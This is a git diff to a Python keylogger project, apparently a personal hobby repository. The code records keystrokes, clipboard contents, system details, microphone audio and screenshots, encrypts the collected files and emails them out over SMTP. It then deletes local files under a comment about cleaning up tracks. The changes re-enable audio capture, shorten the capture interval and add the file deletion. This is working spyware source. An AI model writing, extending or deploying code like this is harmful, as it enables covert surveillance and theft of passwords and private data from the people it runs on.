@@ -10,6 +10,7 @@ import smtplib
 import socket
 import platform
 from email.quoprimime import body_check
+from idlelib.outwin import file_line_pats
 from tkinter import image_types
 
 # Clipboard
@@ -33,6 +34,7 @@ from requests import get
 
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
+from six import with_metaclass
 
 keys_information = "keys_log.txt"
 system_information = "system_info.txt"
@@ -46,10 +48,15 @@ system_information_e = "e_system_info.txt"
 clipboard_information_e = "e_clipboard.txt"
 
 microphone_time = 10
-time_iteration = 15
+time_iteration = 5
 number_of_iterations_end = 3
 
+with open("D:\\My GitHub\\rachit404\\python_keylogger\\Cryptography\\encryption_key.txt", 'rb') as f:
+    key = f.read()
+
 file_path = "D:\\My GitHub\\rachit404\\python_keylogger\\MainProject\\"
+with open(file_path + keys_information, 'w') as f:
+    f.write("")
 
 load_dotenv()
 fromaddr = os.getenv("EMAIL_SENDER")
@@ -83,7 +90,7 @@ def send_mail(filename, attachment, toaddr):
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
-send_mail(keys_information, file_path+keys_information, toaddr)
+# send_mail(keys_information, file_path+keys_information, toaddr)
 
 def computer_information():
     with open(file_path+system_information, "a") as f:
@@ -121,7 +128,7 @@ def microphone():
     sd.wait()
 
     write(file_path+audio_information, sampling_feq, myrecording)
-# microphone()
+microphone()
 
 def screenshot():
     img = ImageGrab.grab()
@@ -170,8 +177,8 @@ while number_of_iterations < number_of_iterations_end:
         listener.join()
 
     if currentTime > stopping_time:
-        with open(file_path + keys_information, "w") as f:
-            f.write(" ")
+        # with open(file_path + keys_information, "w") as f:
+        #     f.write(" ")
 
         screenshot()
         send_mail(screenshot_information, file_path+screenshot_information, toaddr )
@@ -187,7 +194,6 @@ files_to_encrypt = [file_path + system_information,
 encrypted_file_names = [file_path + system_information_e,
                         file_path + clipboard_information_e,
                         file_path + keys_information_e]
-
 count = 0
 for _ in files_to_encrypt:
     with open(files_to_encrypt[count], 'rb') as f:
@@ -202,7 +208,13 @@ for _ in files_to_encrypt:
     send_mail(encrypted_file_names[count], encrypted_file_names[count], toaddr)
     count += 1
 
-time.sleep(120)
+time.sleep(60)
+
+# Clean up tracks and delete files
+delete_files = [system_information,
+                clipboard_information]
+for file in delete_files:
+    os.remove(file_path + file)
 
 
 
